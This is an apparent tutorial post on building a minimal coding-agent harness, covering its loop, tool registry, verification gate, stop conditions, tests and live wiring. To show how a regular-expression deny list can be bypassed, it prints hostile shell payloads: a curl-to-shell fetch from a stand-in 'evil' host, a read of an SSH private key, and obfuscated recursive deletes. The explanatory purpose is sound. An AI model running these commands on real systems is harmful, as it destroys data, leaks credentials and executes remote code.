# 24 - Build #1: a minimal agent harness from scratch

> **TL;DR.** The smallest real harness is four primitives the series has already built, a loop, a schema-validated tool registry, a verification gate and layered exits, assembled in [`code/24-minimal-harness/`](../../code/24-minimal-harness/) into 520 lines of Python, 451 of them engine. It writes code, checks it against tests before it accepts a final answer, and stops for a reason it can name. Every expensive dependency is a seam, so the ten tests run offline with no application programming interface (API) key, and the same seams are where a live model and Build #2's hardening plug in.
>
> **Prerequisites:** [post 03](../03-the-agent-loop/index.md), the loop and its four exits; [post 06](../06-tools-bash-code/index.md), the tool contract; [post 11](../11-verification-loops/index.md), the verification gate; [post 19](../19-loop-engineering/index.md), layered exits and budgets.
> **Safe to skip?** Skip it if the reader can already write a verified agent loop with layered exits from a blank file, test each exit offline, and say what such a suite cannot see.
>
> **After reading, you will be able to:**
>
> - Assemble a harness from a loop, a schema-validated tool registry, a verification gate and layered exits, injecting every expensive dependency as a seam.
> - Gate the final-answer exit so that a run ends completed only on verified work, and feed each rejection back as a report the model can act on.
> - Place the budget and no-progress checks inside the loop, and bound the overrun of a budget that is checked after each call.
> - Prove each exit fires with a scripted model, and name what an offline suite structurally cannot see.
> - Take the harness live by swapping its seams, and name what a minimal build leaves out and which post adds each piece.

![The engine of Build #1 as a component map: the loop at the centre, the model seam and the verification gate on the left, the tool registry on the right, each labelled with its file and line count, and the loop's four exits along the bottom, the first taken when the gate passes.](diagrams/01-minimal-architecture.svg)

*Four primitives from Parts I to IV in four files; a rejected answer goes back into the loop, and only a pass leaves through exit (1).*

---

## 1. The spec: what is the smallest real harness?

What is the smallest harness that can be handed a coding task and trusted either to finish it correctly or to stop trying, and what does assembling it teach? [Post 20](../20-sdk-landscape/index.md) surveyed the software development kits (SDKs) that ship a harness prebuilt; this post, the first of the series' three builds, assembles one by hand. Writing the prebuilt half once is what makes [post 02](../02-anatomy-of-a-harness/index.md)'s seam between a prebuilt harness and the custom layer visible.

Nothing here is new machinery. It is the loop of [post 03](../03-the-agent-loop/index.md), the tools of [post 06](../06-tools-bash-code/index.md), the verification of [post 11](../11-verification-loops/index.md) and the exits of [post 19](../19-loop-engineering/index.md), snapped together; in the eleven-component vocabulary, component 01, loop, component 02, tools, and component 06, verification. The sibling series ran the same exercise on retrieval in `ctx-028`; this is the runtime version of it.

Build #1 reduces to five requirements, each traceable to an earlier post, and four of them preventing a failure mode the series has already named ([post 05](../05-agent-failure-modes/index.md)).

| The harness must | Because otherwise | Failure mode it prevents |
|---|---|---|
| Call the model repeatedly until a stop condition fires | one call cannot act on a result it has not yet seen | one-shotting |
| Validate every tool call against a schema before executing it | a malformed or hallucinated argument reaches the tool body | destructive action |
| Check the work against ground truth before accepting a final answer | the run ends the moment the model claims to be finished | victory declaration |
| Bound the run by iterations, by tokens and by a stall signal | a retrying loop burns the budget quietly and indefinitely | doom loop |
| Return counters alongside the answer | a run nobody can cost is a run nobody can budget | none; this is the input to [post 23](../23-economics-haas/index.md) |

That is the whole product. Isolation, deterministic enforcement, human approval, sub-agents and tracing are all out of scope, and all five belong to [post 25](../25-build-harness-plus/index.md). The constraint that shapes the code more than any of them is a testing one: the whole thing has to run with the network off. That requirement decides the architecture, not merely the test suite.

---

## 2. Layout

Before any code, the shape. The package is four modules of engine, a demo and an export file, with one test file beside it. Read in this order, nothing is forward-referenced.

```text
code/24-minimal-harness/
├── README.md
├── pyproject.toml                       # zero runtime dependencies
├── src/
│   └── minimal_harness/
│       ├── __init__.py         20       the public surface: one import for everything
│       ├── models.py          108       ModelResponse, ScriptedModel, AnthropicModel
│       ├── tools.py           160       schema validator, registry, bash, write_file
│       ├── verify.py           75       Candidate, VerifyResult, python_function_tests
│       ├── harness.py         108       run(): the loop, the gate, the four exits
│       └── __main__.py         49       the offline demo
└── tests/
    └── test_harness.py        138       ten tests, no network, no key
```

The counts are `wc -l`, comments and docstrings included, the measure [post 20](../20-sdk-landscape/index.md) uses for the same files, and `snippets/line_count.py` computes them: 520 lines in the package, 451 of them engine, and 332 "code lines" once blank lines, comment-only lines and docstrings are left out. Each engine module is one primitive from an earlier post: `harness.py` the loop of post 03 with the layered exits of posts 03 and 19 (the exits are positions inside the loop, not a separate component), `tools.py` the registry of post 06, `verify.py` the gate of post 11, and `models.py` the model seam of post 03.

The loop function itself, `run`, is 41 code lines, 59 by `wc -l`. Keeping it that small is not minimalism for its own sake: it is the only condition under which all of it can be read in one sitting and checked against what the harness claims to do.

`pyproject.toml` declares no runtime dependencies at all, and the Anthropic adapter sits behind an optional `anthropic` extra, so the package imports and tests cleanly on a machine with no provider SDK and no credentials. That is a deliberate property rather than an accident of a small build, and the section on making it live is where it is paid for.

---

## 3. The loop

The engine is the ReAct (reason and act) loop from [post 03](../03-the-agent-loop/index.md), unchanged in shape: call the model, append its message, and if it asked for tools, run them and feed the results back. The loop keeps a `messages` list in the provider's native format, so swapping the scripted test model for a real one is a thin adapter rather than a rewrite. This is the model-plus-loop framing Anthropic gave in "Building effective agents" (Schluntz and Zhang, 19 December 2024), where agents are models "using tools based on environmental feedback in a loop" and "it's also common to include stopping conditions (such as a maximum number of iterations)"; the exits and the gate are the parts that make it survivable. The function opens like this in `harness.py`:

```python
def run(model: Model, registry: ToolRegistry, task: str, *,
        system: Optional[str] = None, verify: Optional[Verifier] = None,
        workspace: Optional[Workspace] = None, max_iters: int = 12,
        token_budget: Optional[int] = None, no_progress_window: int = 3) -> Result:
    workspace = workspace if workspace is not None else Workspace()
    messages: list[dict] = [{"role": "user", "content": task}]
    tokens_used = 0
    recent: list[str] = []

    for step in range(1, max_iters + 1):
        # --- REASON ---------------------------------------------------------
        resp = model.respond(system, messages, registry.specs())
        tokens_used += resp.tokens
        messages.append({"role": "assistant", "content": resp.content_blocks})
```

Next come the gate on a final answer (the verification gate, below) and the budget and no-progress checks (layered stop conditions, below). The turn ends with the act and observe steps:

```python
        # --- ACT + OBSERVE --------------------------------------------------
        results = []
        for tu in resp.tool_uses:
            observation = registry.dispatch(tu.name, tu.input)
            results.append({"type": "tool_result", "tool_use_id": tu.id,
                            "content": observation})
        messages.append({"role": "user", "content": results})
```

If the `for` loop runs out of turns, `run` returns `StopReason.MAX_ITERS`, exit (2), the backstop that guarantees termination. Nothing else in the companion drives the model.

One detail in the observe step is easy to skip past. Every tool result is wrapped as a `tool_result` block carrying the `tool_use_id` of the model's own request, because the Messages API pairs a call with its result by that identifier and rejects a result it cannot pair.

A second detail decides what counts as a final answer. `ModelResponse.is_final()` in `models.py` is true when the response asked for no tools; it never reads the provider's stop reason, while the [notation guide](../../notation_guide.md) and post 03 define exit (1) by a terminal stop reason (`end_turn` or `stop_sequence`), a check post 03's companion also leaves out. Offline the two agree; live they can differ, as the section on making it live shows.

### Every expensive thing is a seam

The single design decision that shapes the whole companion is that **nothing slow, costly or dangerous is constructed inside the harness**. The model is a parameter. The shell runner is a parameter, injected into the bash tool. The verifier is a parameter. The workspace is a parameter. Four seams: three in the signature above, and the runner in `make_bash_tool`'s.

That is why the suite runs offline: the tests pass a `ScriptedModel` replaying a fixed list of responses, and a runner that returns a canned string instead of executing anything. The loop cannot tell the difference, which is the point. The thing under test is *the harness*; the model is not.

The check is three questions: does the suite run with the network off, with `ANTHROPIC_API_KEY` unset, and with no test over a second? Build #1 answers yes to all three: `uv run --extra dev pytest -q` reports `10 passed in 0.17s` on the machine this post was checked on. The third question does the real work, because a harness can have a seam and still not use it, and a slow suite is usually talking to a network.

The seam has to be there from the first commit, because a harness that constructs its own model cannot be driven by a fake one, and adding the seam afterwards touches every call site. It also buys less than it looks like. [Post 14](../14-permissions-sandboxes/index.md) records that Build #2's sandbox once checked the first token of a command and then ran the raw string through a shell, a bypass nothing caught because every test injected a fake runner and nothing exercised the real executor. Seams make a harness testable; they do not make the code behind the seam tested, and the section on tests returns to that.

---

## 4. The bash and file tools

Tools are the act step of the loop ([post 06](../06-tools-bash-code/index.md)). Build #1 ships two: a `write_file` tool that puts content into the workspace, and a deny-listed `bash` tool with an injectable runner. Both go through a `ToolRegistry` whose `dispatch` method in `tools.py` is the whole discipline in one place:

```python
    def dispatch(self, name: str, tool_input: dict) -> str:
        """Validate, then execute. Returns an observation string; never raises."""
        tool = self._tools.get(name)
        if tool is None:
            return f"error: unknown tool '{name}'"
        problems = validate(tool_input, tool.input_schema)
        if problems:
            return "error: invalid input: " + "; ".join(problems)
        try:
            return tool.run(tool_input)
        except Exception as e:  # a tool must not crash the loop
            return f"error: {type(e).__name__}: {e}"
```

Eleven lines of code, identical to post 06's companion, and every branch returns a string. That is the property the loop depends on: a bad tool name, a malformed argument, a blocked command and an exception inside the tool all come back as observations the model can reason about, not as a traceback that ends the run.

The schema is the other half. Here is the bash tool's, the end of `make_bash_tool` in `tools.py`:

```python
    return Tool(
        "bash",
        "Run a shell command and return its combined output. Dangerous commands "
        "are refused.",
        {"type": "object", "properties": {"command": {"type": "string"}},
         "required": ["command"], "additionalProperties": False},
        run,
    )
```

Two clauses in that JavaScript Object Notation (JSON) Schema object do the enforcement, and they catch opposite mistakes. `required` catches an argument the model left out. `additionalProperties: false` catches an argument the model invented, which is the more interesting of the two: a model used to other shell tools may well send a `cmd` key, and a validator that only checks the keys it knows about passes that call through with the real argument missing. The companion's `validate` checks both directions, and `test_validate_catches_missing_and_extra_properties` asserts both.

These strings are the agent's entire view of a failed call. `snippets/dispatch_table.py` makes five failed calls against the companion's registry, the first three with a runner that only records the command, the last two through the real `subprocess_runner` with harmless Python one-liners:

```text
an unknown tool name: error: unknown tool 'grep_files'
  reached the runner: False
an invented argument: error: invalid input: $: missing required property 'command'; $: unexpected property 'cmd'
  reached the runner: False
a deny-listed command: blocked: command matches a deny-list rule (\brm\s+-[rf])
  reached the runner: False
a command that times out: error: TimeoutExpired: Command 'python -c "import time; time.sleep(2)"' timed out after 0.5 seconds
a command that exits non-zero: (exit 2) nope
```

The first three are refused before the runner is touched; the timeout is `subprocess`'s own `TimeoutExpired`, caught by the `try` around the runner. The last line is the one most easily got wrong: a failing command is not a harness fault, and turning it into one hides the exit code from the only party that can act on it.

---

## 5. The verification gate

This is the component that separates Build #1 from a toy. A bare loop exits the moment the model stops calling tools, which is to say the moment it *claims* to be done. That is a victory declaration waiting to happen ([post 05](../05-agent-failure-modes/index.md)). The gate makes "done" mean "verified". Here is the gate block of `run`, verbatim:

```python
        # --- the model proposes a final answer: the GATE decides ------------
        if resp.is_final():
            candidate = Candidate(resp.text, workspace)
            verdict = verify(candidate) if verify else VerifyResult(True)
            if verdict.ok:
                # stop (1): the only exit that returns verified work
                return Result(resp.text, StopReason.COMPLETED, True, step,
                              tokens_used, "", messages)
            # gate failed: feed the report back as the next observation and
            # keep going (Post 11). The failure is verbose; success is silent.
            messages.append({"role": "user",
                             "content": f"verification failed: {verdict.report}"})
            recent.clear()  # a real correction is progress; reset the detector
            # the budget governs this path too: a gate rejection is a spent
            # model call, and skipping the check here made BUDGET unreachable
            # whenever the gate kept rejecting.
            if token_budget is not None and tokens_used >= token_budget:
                return Result(None, StopReason.BUDGET, False, step, tokens_used,
                              "token budget exhausted", messages)
            continue
```

Thirteen lines of code, and three ideas in them.

**A candidate is the answer plus the work.** `Candidate` carries `resp.text` and the whole workspace, because the model's prose is not the artefact. A claim that `is_palindrome` was implemented is unfalsifiable; the file the claim refers to is not.

**A verifier is a function from a candidate to a verdict.** That contract is the reusable part of this build. Anything taking a `Candidate` and returning a `VerifyResult` is a gate, which is why swapping a test-runner gate for a schema check or a judge is a one-function change and not a change to the loop.

**Success is silent, failures are verbose.** The principle is HumanLayer's ("Skill Issue: Harness Engineering for Coding Agents", 12 March 2026: "success is silent, and only failures produce verbose output"), the wording Osmani's in "Agent Harness Engineering" (April 2026), and [post 11](../11-verification-loops/index.md) builds its feedback loop on it. `VerifyResult(True)` carries an empty report. A rejection carries what the model needs, and the shipped verifier in `verify.py` builds it one failing case at a time:

```python
        failures = []
        for args, expected in cases:
            try:
                got = fn(*args)
            except Exception as exc:
                failures.append(f"{fn_name}{args!r} raised {type(exc).__name__}: {exc}")
                continue
            if got != expected:
                failures.append(f"{fn_name}{args!r} == {got!r}, expected {expected!r}")
        if failures:
            return VerifyResult(False, "; ".join(failures))
        return VerifyResult(True)
```

That f-string is what gives the model something to fix: `is_palindrome('abc',) == True, expected False` names the input, the actual and the expected, the minimum an actionable report needs. A bare boolean gate hands back "no" and leaves the next turn to re-derive the problem. Before the cases, the same verifier reports a missing file, a file that fails to import and a missing function, each in words of its own.

### Choosing the verifier

Build #1 hard-codes function-test execution because the demo task is a pure function, the easiest gate there is. [Post 11](../11-verification-loops/index.md) gives the test for whether a task admits a gate at all; the table below is the narrower question of what plugs into this seam once it does.

| Ground truth | The verifier, concretely | Cost per gate call | What Build #1 would need |
|---|---|---|---|
| Test cases against a written function | `python_function_tests`, shipped | microseconds, in-process | nothing; this is the default |
| A real test suite | a function that shells out to `pytest -q` and reads the exit code | seconds, and a timeout of its own | a live runner and an on-disk workspace |
| A schema, for structured output | `validate` from `tools.py`, pointed at the answer instead of a tool call | microseconds | a few lines; the validator already exists |
| An independent judge, for prose | a second model call scoring against a written contract | one model call, plus a positive skew of its own | a second model and a rubric ([post 12](../12-planner-generator-evaluator/index.md)) |
| None available | `verify=None` | free, and worth exactly that | an honest verdict field (see the section on tests) |

The rows are in cost order, and that ordering is the advice: reach for the cheapest verifier that can settle the question, and add an expensive one only where the cheap one is silent.

---

## 6. Layered stop conditions

A loop that can retry indefinitely is a doom loop with extra steps. Build #1 carries the four layered exits of [post 03](../03-the-agent-loop/index.md) and [post 19](../19-loop-engineering/index.md), and its `StopReason` values are spelled exactly as the series spells the exits.

| Exit | `StopReason` value | What fires it | What the result carries |
|---|---|---|---|
| (1) final answer | `completed` | a final answer the gate accepted | the answer, and `verified` true |
| (2) iteration cap | `max_iters` | `max_iters` turns (12 by default) spent without a pass | the transcript, and nothing verified |
| (3) budget | `budget` | `tokens_used` has reached `token_budget` | the spend to date |
| (4) no progress | `no_progress` | the same tool-call signature three turns running | the transcript, with the repeating calls |

Between the gate and the act step, `run` checks exit (3) first:

```python
        # --- stop (3): a real cost ceiling, checked before spending more ----
        if token_budget is not None and tokens_used >= token_budget:
            return Result(None, StopReason.BUDGET, False, step, tokens_used,
                          "token budget exhausted", messages)
```

and then exit (4), against a window of the last three turns' tool calls:

```python
        recent.append(_signature(resp.tool_uses))
        window = recent[-no_progress_window:]
        if len(window) == no_progress_window and len(set(window)) == 1:
            return Result(None, StopReason.NO_PROGRESS, False, step, tokens_used,
                          "no progress: identical tool calls repeating", messages)
```

The exits are the safety surface, which is why the suite forces each one individually. Three details in how they interact are load-bearing and easy to miss.

### A real correction resets the stall detector

When the gate rejects and the report goes back, the gate block calls `recent.clear()`. Without that line, an agent that fixes a bug and re-submits looks to the detector like an agent repeating itself, and the run is killed for making progress. Any stall detector sitting alongside a retry loop needs this. Neither feature is wrong on its own; the bug lives in the join, which is why it appears only once both features do.

### The budget check has to sit on both paths

A rejected final answer is a spent model call like any other, which is why the budget check appears twice: once inside the gate block, and once above the act step. It has not always. The series' audit of 4 September 2026 found the budget of Build #1 unenforceable, and the companion and this post were corrected the next day: the companion had checked the budget only on the tool-call path, so a model that kept declaring done and kept failing the gate never reached the check, and the run spent to `max_iters` instead. The stated ceiling had silently become an iteration ceiling, a different number with a different cost. The comment above the second check in the gate block records the fix, and `test_budget_stops_the_run_when_the_gate_keeps_rejecting` pins it.

The order of the checks is the exercise of this post. `snippets/budget_order.py` reads where each decision sits in `run` and then drives the companion with scripted token counts, illustrative rather than any model's:

```text
inside run() in harness.py, in the order each turn meets them:
  line  62: model call counted
  line  66: final-answer branch: the gate
  line  81: budget check, gate-rejection path
  line  87: budget check, tool-call path
  line  94: no-progress check
  line 101: tools run

tool-call path, 50 tokens a turn, token_budget=120: exit budget, iteration 3, 150 tokens, verified False

gate-rejection path, an always-rejecting gate, token_budget=2,000, max_iters=40:
    600 tokens a turn: exit budget at iteration 4, 2,400 tokens spent, 20% over the ceiling
  1,500 tokens a turn: exit budget at iteration 2, 3,000 tokens spent, 50% over the ceiling
  2,500 tokens a turn: exit budget at iteration 1, 2,500 tokens spent, 25% over the ceiling

a final answer that passes the gate, token_budget=2,000: exit completed, iteration 2, 2,500 tokens, verified True
```

Every budget check runs *after* the call it might have stopped, because `tokens_used` already includes the call that just returned: the check stops the run before the next call, not before the one that crossed the line. The overrun is at most one call, a bound in tokens rather than in percent: at 600 tokens a turn the fourth call takes the run from 1,800 to 2,400, 20% over, and a single 2,500-token call is 25% over on its own. That is the right trade for a minimal build, but it is not a hard ceiling; [post 19](../19-loop-engineering/index.md) reserves for the next call before making it and never crosses.

The first lines of the output also correct an easy misreading of this design: the budget check does *not* fire before the final-answer branch. The gate comes first on every turn, and the one path with no budget check is a final answer that *passes* it, which returns `completed` however much it cost, as the last line shows at 2,500 tokens against a 2,000 ceiling. Discarding verified work already paid for, to enforce a ceiling already crossed, helps nobody.

### What the detector compares decides what it catches

The no-progress signal is one function in `harness.py`:

```python
def _signature(tool_uses: list[ToolUse]) -> str:
    """A stable fingerprint of a turn's tool calls, for no-progress detection."""
    return json.dumps([[tu.name, tu.input] for tu in tool_uses], sort_keys=True)
```

It fingerprints the *requests*, never the observations; the loop does not compare results at all. That is the cheapest of the three stall signals of [post 19](../19-loop-engineering/index.md) (the tool-call signature, the effect on disk and the verifier's score), and it has the failure profile that goes with cheapness, in both directions. `snippets/stall_signal.py` drives the companion three ways with a runner that executes nothing:

```text
1. poll 'ci status', output changing ['build queued', 'build running']: exit no_progress at iteration 3
2. 'echo 0', 'echo 1', ... for 20 turns, nothing achieved: exit max_iters at iteration 20
3. 'pytest -q' then done, three times over, the first two rejected: exit completed at iteration 6, verified True
```

- **A false positive.** An agent legitimately polling a command against a changing world is killed as thrashing: the third identical `ci status` stops the run before it can see the build pass.
- **A false negative.** An agent varying its arguments while achieving nothing sails past. Twenty turns of `echo 0`, `echo 1`, `echo 2` produce twenty distinct signatures and run to the cap, spending everything on nothing.
- **The reset at work.** The same `pytest -q` three times would trip the detector, but the first two runs of it are each followed by a rejected final answer, each rejection clears the window, and the run reaches exit (1) on the third attempt.

The two better signals are the observable effect, whether anything changed on disk, and the verifier's score across iterations. Build #1 implements neither, so its detector is the default rather than the answer. The window of three, rather than one, is the tolerance that keeps a single retry after a transient error from reading as a stall; it is not enough to save the polling agent above.

---

## 7. Running it on a real task

The demo is the smallest task that exercises the whole engine: write `is_palindrome`, get it wrong, get caught, fix it. From inside `code/24-minimal-harness/`, `uv run python -m minimal_harness` prints the raw message list, whose assistant turns are content-block dictionaries. `snippets/task_run.py` runs the same `main()` unchanged, keeps the `Result` it produces, and prints one line per iteration; it then runs the same script once more with `verify=None`, so that only the harness changes:

```text
the companion's demo, with the palindrome gate:
  iteration 1  model: write_file solution.py: return s == s  # bug: always true
               harness: wrote 60 bytes to solution.py
  iteration 2  model: final answer
               harness: verification failed: is_palindrome('abc',) == True, expected False
  iteration 3  model: write_file solution.py: return s == s[::-1]
               harness: wrote 46 bytes to solution.py
  iteration 4  model: final answer
               harness: the gate passes and run() returns
  stop_reason completed, verified True, iterations 4, tokens_used 54

the same model and script, two harnesses:
  verify=None      completed, verified True, 2 iterations, 28 tokens, leaves: return s == s  # bug: always true
  palindrome gate  completed, verified True, 4 iterations, 54 tokens, leaves: return s == s[::-1]
```

![Two runs of the companion's demo drawn one column per iteration. With the gate: a buggy write, a final answer the gate fails with the report is_palindrome('abc',) == True, expected False, a fixed write, and a final answer the gate passes after 4 iterations and 54 tokens. With verify=None: the same buggy write, then a final answer that ends the run as completed and verified after 2 iterations and 28 tokens, shipping the bug.](diagrams/02-task-run-sequence.svg)

*The run with the gate turns the first "done" into a report; the run without it ships the bug and reports it verified.*

The figure lays the two runs side by side. Four moments in them matter.

**Iteration 2 is the whole post.** The model said "done", and on a bare loop that sentence ends the run and ships `s == s`. Here the gate runs, the check fails, and the claim is overruled by a function that does not care what the model believes.

**The report arrives as an ordinary user message**, not as a `tool_result`, because no tool was called on that turn. The gate is part of the harness, not part of the tool surface.

**`completed` and `verified` are two fields**, deliberately: one says the loop reached its intended exit, the other that the gate said yes. Build #1 gets this half right: the lower run reports `verified True` with no gate at all, which the next section takes apart.

**The counters are on the result** because the budget exit needs them anyway, and a run nobody meters is a run nobody can budget ([post 23](../23-economics-haas/index.md)). The demo's token counts are set by hand; live, they come from the adapter.

---

## 8. Tests: what the suite pins down, and what it cannot see

A harness is trustworthy only if it can be shown to stop. "It has stop conditions" is a claim; a test that drives the loop into each exit on purpose is evidence. The suite is one file and it does exactly that. Here is its stall-detector test from `tests/test_harness.py`:

```python
def test_no_progress_detection():
    reg = ToolRegistry([make_bash_tool(runner=lambda c, t: ("same", 0))])
    script = [tool_response("bash", {"command": "echo same"}, id="b", tokens=1)
              for _ in range(20)]
    res = run(ScriptedModel(script), reg, "thrash", max_iters=20,
              no_progress_window=3)
    assert res.stop_reason is StopReason.NO_PROGRESS
    assert res.iterations == 3
```

It has the shape every harness test should have: construct a model that will provoke exactly one behaviour, run the harness, and assert on the stop reason rather than on the output. No test in the file asserts anything about what the model said; where one reads the transcript, it checks that the harness injected the gate's report, not that the model reacted well to it.

Ten tests, and each names a behaviour rather than a function.

| The test | What it forces |
|---|---|
| `test_gate_passes_verified_solution` | the intended exit: a final answer that passed, at iteration 2 |
| `test_gate_rejects_then_accepts_after_feedback` | rejection, an injected report, and recovery |
| `test_no_verifier_means_final_answer_completes` | the degenerate case, so the gate is opt-in rather than assumed |
| `test_max_iters_backstop_when_gate_never_passes` | the loop terminates at the cap when the gate never passes |
| `test_budget_stops_the_run` | the cost ceiling fires on the tool-call path |
| `test_no_progress_detection` | the thrashing detector fires, at the third repeat |
| `test_bash_tool_denies_dangerous_commands` | the deny list refuses `rm -rf /` and lets `echo hi` through |
| `test_schema_rejects_malformed_tool_call` | a bad call is an observation, not a crash |
| `test_validate_catches_missing_and_extra_properties` | the schema is enforced in both directions |
| `test_budget_stops_the_run_when_the_gate_keeps_rejecting` | the same ceiling fires on the gate-rejection path, with at most one iteration of overrun |

The two budget tests are the pair worth studying, because for a long time only the first existed and the exit it claimed to test was reachable on one path out of two. A test table is exactly as good as the paths it covers, and a column of green ticks is a comfortable way not to notice a gap.

### What the suite structurally cannot see

Naming this is part of shipping the suite, because ten green tests otherwise read as covering far more than they do.

- **The live model and the real shell are never executed.** Every test injects a double, so `AnthropicModel` and `subprocess_runner` have no coverage by construction. That is the same hole that let Build #2 ship its sandbox bypass ([post 14](../14-permissions-sandboxes/index.md)): the seam buying the fast suite is also the seam hiding the code behind it.
- **`ScriptedModel` ignores the messages it is given.** No test can therefore detect a prompt regression, a transcript the provider would reject, a lost `tool_use_id` pairing, or a context grown past the window. The harness could be assembling nonsense and every test would still pass.
- **The deny list is tested against the deny list.** `test_bash_tool_denies_dangerous_commands` asserts that `rm -rf /` is refused. It says nothing about what is not on the list, and the section on what was left out has the answer.
- **One test pins a field that lies.** `test_no_verifier_means_final_answer_completes` asserts `res.verified is True` for a run in which nothing verified anything, because `run` computes `verdict = verify(candidate) if verify else VerifyResult(True)`; the lower run of the figure above is the same lie on the demo task. The state the two fields exist to make visible, work finished but unchecked, is the one state they cannot express. The fix is a three-valued field: true on a pass, false on a rejection, `None` when no gate ran. A boolean that defaults to the good value lies in precisely the case it was invented for.

---

## 9. Making it live

The central design claim of the section on the loop is that four seams make the swap to production cheap. Here is the swap, and its price.

| Seam | The double the tests inject | The live version | What changes about the risk |
|---|---|---|---|
| Model | `ScriptedModel`, replaying a fixed list | `AnthropicModel()`, plus the `anthropic` extra and a key in the environment | the run becomes non-deterministic and metered |
| Shell runner | a function returning a canned string | `subprocess_runner` | commands execute for real, with `shell=True`, behind eight regular expressions |
| Workspace | `Workspace`, a dictionary of path to contents | a real directory, which Build #1 does not ship | files outlive the run, and can be overwritten or deleted |
| Verifier | `python_function_tests`, in-process | a shell-out to the project's own suite | seconds per gate call, and a timeout to set |

The right-hand column is the price of leaving the offline suite. The live wiring is one file; nothing in the package changes. `snippets/live_wiring.py` builds it from the companion:

```python
workspace = Workspace()
registry = ToolRegistry([
    make_write_file_tool(workspace),
    make_bash_tool(runner=subprocess_runner, timeout=10.0),   # a real shell
])
verify = python_function_tests("solution.py", "is_palindrome",
                               [(("racecar",), True), (("abc",), False), (("",), True)])


def go_live():
    return run(AnthropicModel(), registry, TASK, verify=verify,
               workspace=workspace, max_iters=12, token_budget=200_000)
```

The 200,000-token budget is illustrative. The snippet never calls `go_live()`. It hands `AnthropicModel` a recorder in place of the Anthropic client, through the adapter's own `_client` field, makes one call, and prints what the adapter would send to `messages.create`:

```text
model: claude-sonnet-5
max_tokens: 1024
tools: ['write_file', 'bash']
messages: 1, first from user
keys sent: ['max_tokens', 'messages', 'model', 'tools']
```

`claude-sonnet-5` is the default in `models.py`, and it is a real identifier: Anthropic's "Claude Sonnet 5" model page lists it as a legacy model, still available, with Claude Sonnet 5.5 as the current Sonnet (consulted October 2026). The adapter passes the harness's `messages` list through unchanged, adds `system` only when one is set, and sums `usage.input_tokens + usage.output_tokens` into the response's token count.

Two of its defaults matter the moment it goes live. `max_tokens` is 1,024, so a long answer can be cut off; the response then carries no tool call, `is_final()` calls it a final answer, and the gate judges a truncated candidate. With a gate, that costs a rejection and a retry; with `verify=None`, the truncated text is returned as `completed`. Reading the response's stop reason, as post 03's `snippets/stop_reasons.py` does, is the fix.

That wiring swaps three of the four seams and leaves the fourth alone, because the workspace is the one seam Build #1 ships no live implementation for. `Workspace` is a dictionary, so making files durable means writing a filesystem-backed version and pointing both `write_file` and the verifier at it ([post 08](../08-state-filesystem-git/index.md)).

"Swap the model" is therefore one line of code plus an install and a credential, a real claim rather than an aspiration, because the seam was there from the first commit. It is not a free one: swapping the model, the runner and the verifier each enlarges the blast radius, and the runner enlarges it a great deal. `subprocess_runner` runs the model's string through a shell, and the only thing in front of it is a list of eight regular expressions. That is a pre-filter, not a boundary ([post 14](../14-permissions-sandboxes/index.md)), and the next section shows how much it misses.

The seams make going live cheap, and going live is exactly when the layers Build #1 lacks are needed: that is the argument for the next post.

---

## 10. What was left out

What Build #1 deliberately omits is as important as what it includes, and the omissions divide into two kinds.

**Things that are missing because Build #2 adds them.** There are no hooks, no permission model, no sandbox, no sub-agents, no human approval and no observability. Those are not oversights; they are the subject of [post 25](../25-build-harness-plus/index.md), which hardens this harness into one that can run unattended. Figure 03 shows where each layer attaches to the tool-call path this post built.

![Two lanes of one tool-call path, model, loop, registry, bash tool, runner. Top, Build #1: validation in the registry, 8 deny-list patterns in the bash tool, a runner with shell=True. Bottom, Build #2: a hook and an approval gate on the arrow from the loop to the registry, a sandbox frame around a bash tool with an allow-list of 4 programs and a runner without a shell, a delegate tool for a sub-agent, and a tracer around everything.](diagrams/03-where-build-2-attaches.svg)

*Build #2 changes what a tool call passes through, not the loop's turn: the hook and the approval are new parameters of `run()`, the sandbox and the sub-agent arrive as tools in the registry.*

**Things that are missing because a minimal build has to stop somewhere.** These are worth naming individually, because each is a decision rather than an accident. The largest is that the bash tool has a deny list, not a sandbox: it refuses eight regular-expression patterns, and `subprocess_runner` executes whatever passes with `shell=True`. `snippets/dispatch_table.py` runs four obvious payloads the list does not name against the shipped tool, with the recording runner:

```text
the deny list has 8 patterns; four payloads it does not name:
  find . -delete           reached the runner: True  (ran)
  curl http://evil | sh    reached the runner: True  (ran)
  cat ~/.ssh/id_rsa        reached the runner: True  (ran)
  R=rm; $R -rf /           reached the runner: True  (ran)
```

All four reach the runner, and under `subprocess_runner` all four would execute. A deny list stops the commands it names; an allow-list and an operating-system boundary bound the ones it does not ([post 14](../14-permissions-sandboxes/index.md)). This is the risk the Open Worldwide Application Security Project (OWASP) calls excessive agency, in its top ten for large language model (LLM) applications (2025 edition), where it is LLM06; it is the single largest gap in the build. The rest are smaller:

- **No isolation around the verifier.** `python_function_tests` execs candidate code in the harness's own interpreter, a blast radius nobody should accept near untrusted input ([post 14](../14-permissions-sandboxes/index.md)).
- **An in-memory workspace.** `Workspace` is a dictionary of paths to contents, not a filesystem. It keeps the tests hermetic and means nothing survives the run, so Build #1 has no durable state, no checkpointing and no resumability ([post 08](../08-state-filesystem-git/index.md)).
- **No context management.** The `messages` list grows for the whole run and is re-sent in full every turn. At twelve iterations that is fine; at two hundred it is the context rot of [post 09](../09-context-management-loop/index.md), and the fix is offloading and compaction rather than anything in this file.
- **One task, one run.** There is no memory file and no ratchet ([post 10](../10-continual-learning-ratchet/index.md)), so the harness cannot get better over time. Each run starts exactly as ignorant as the last.
- **A verdict field that cannot say "unchecked".** The three-valued fix from the section on tests, unshipped.

Read that list as a map rather than as a disclaimer: each entry is a post in this series, and the shape of a real harness is Build #1 with those pieces added back in the order the risk demands them.

---

## 11. The lesson the build teaches

Every file in the companion is one earlier post made executable, so an SDK's feature list reads differently after writing them: each bullet now names a file the reader has written.

The build also shows what the series' central claim means, on a scale small enough to check by hand. The two runs of `task_run.py` hold the scripted model, its script, the tools and the task fixed, and change only the harness. The difference between shipping a bug and shipping a correct function is thirteen lines of gate, two extra iterations and 26 more tokens. Nothing about the model changed, and the output did. That is `Agent = Model + Harness` in a form that runs (Trivedy, "The Anatomy of an Agent Harness", 10 March 2026, popularised by Osmani, April 2026). It is a demonstration, not evidence: the model is a script that was written to fail once, so the run grades nothing about a real model, and the measured case for the harness is [post 04](../04-harness-beats-model/index.md)'s. What it does make concrete is where the rest of the series works: everything after this post adds capability or subtracts risk on the harness side of that equation.

What the build still cannot do is the other half of the lesson. It cannot contain a command it did not anticipate, it cannot survive a context longer than a few dozen turns, it cannot remember anything between runs, it cannot say what it did after the fact, and it cannot honestly report that nothing checked its work. Five gaps, each with a post, and the next one starts on the first of them.

---
